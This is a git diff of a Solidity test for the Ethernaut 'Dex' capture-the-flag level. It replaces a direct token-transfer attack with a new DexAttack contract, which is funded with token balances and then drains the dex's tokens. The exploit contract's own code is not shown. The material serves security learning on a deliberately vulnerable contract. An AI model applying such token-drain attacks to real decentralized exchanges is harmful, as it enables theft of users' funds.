@@ -4,6 +4,7 @@ pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
 import "../Dex/Dex.sol";
+import "../Dex/DexAttack.sol";
 import "../Dex/DexFactory.sol";
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
@@ -32,10 +33,14 @@ contract DexTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
-        Dex(dex).approve(msg.sender, 1 << 255);
+        DexAttack dexAttack = new DexAttack();
 
-        IERC20(dex.token1()).transferFrom(_dex, msg.sender, IERC20(dex.token1()).balanceOf(_dex));
-        IERC20(dex.token2()).transferFrom(_dex, msg.sender, IERC20(dex.token2()).balanceOf(_dex));
+        IERC20 token1 = IERC20(dex.token1());
+        IERC20 token2 = IERC20(dex.token2());
+
+        token1.transfer(address(dex), token1.balanceOf(msg.sender));
+        token2.transfer(address(dexAttack), token2.balanceOf(msg.sender));
+        dexAttack.attack(_dex);
 
         //////////////////////
         // LEVEL SUBMISSION //
